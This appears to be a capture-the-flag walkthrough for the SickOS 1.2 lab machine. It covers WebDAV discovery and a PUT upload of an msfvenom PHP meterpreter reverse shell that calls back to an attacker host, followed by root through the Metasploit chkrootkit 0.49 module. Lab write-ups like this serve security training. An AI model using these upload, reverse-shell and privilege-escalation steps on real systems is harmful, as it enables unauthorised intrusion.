--------------------------------
# Author Shubham Ranpise
--------------------------------

# 16/december/2022

# Sick OS 1.2

----------------------------------------------------------------
# nmap scan (website hosted on port 80)
----------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    lighttpd 1.4.28

----------------------------------------------------------------
# got /text directory on website port 80
  (misconfigured)
----------------------------------------------------------------
-> curl -I -X OPTIONS http://10.0.2.12/test
HTTP/1.1 301 Moved Permanently
DAV: 1,2
MS-Author-Via: DAV
Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
Location: http://10.0.2.12/test/
Content-Length: 0
Date: Fri, 16 Dec 2022 13:35:27 GMT
Server: lighttpd/1.4.28

we can upload files on test directory and execute
-> msfvenom -p php/meterpreter_reverse_tcp LHOST $IP LPORT $port > shell.php
-> curl -T shell.php http://10.0.2.12/test/ --http1.0
start multi handler in msfconsole
then run the uploaded shell.php on test directory
you got shell

----------------------------------------------------------------
# privilege escalation
  (vulnerable Chkrootkit 0.49)
----------------------------------------------------------------
got Chkrootkit 0.49 from mannual testing
metasploit module available for privilege escalation
exploit/unix/local/chkrootkit
configure it then run it 
wait for crontab to trigger exploit
you got root

----------------------------------------------------------------
# flag
----------------------------------------------------------------
-> cat cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt

WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

Thanks for giving this try.